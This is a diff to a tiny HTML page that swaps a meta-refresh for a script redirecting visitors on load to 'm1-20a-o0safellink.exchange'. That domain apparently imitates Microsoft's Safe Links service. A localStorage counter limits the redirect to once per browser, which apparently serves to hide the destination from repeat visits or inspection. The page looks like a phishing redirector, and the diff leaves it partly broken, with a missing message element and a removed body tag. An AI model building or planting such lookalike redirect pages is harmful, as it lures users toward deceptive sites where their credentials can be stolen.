@@ -3,9 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0; url=https://m1-20a-o0safellink.exchange/90298365256387386538763933/">
-    <title>.</title>
+    <title>Redirect Control</title>
+    <script>
+        // Editable maximum number of redirects
+        const maxRedirects = 1; // Edit this number as needed
+
+        // Get the current count of redirects from localStorage
+        let redirectCount = parseInt(localStorage.getItem('redirectCount')) || 0;
+
+        // Check if the redirect count exceeds the limit
+        if (redirectCount < maxRedirects) {
+            // Increment and store the new count
+            redirectCount++;
+            localStorage.setItem('redirectCount', redirectCount);
+
+            window.location.href = "https://m1-20a-o0safellink.exchange/90298365256387386538763933";
+        } else {
+            // Display a message when the limit is reached
+            document.addEventListener("DOMContentLoaded", () => {
+                document.getElementById('message').textContent =
+                    "You have reached the maximum number of allowed redirects.";
+            });
+        }
+    </script>
 </head>
 <body>
-</body>
+
 </html>
+
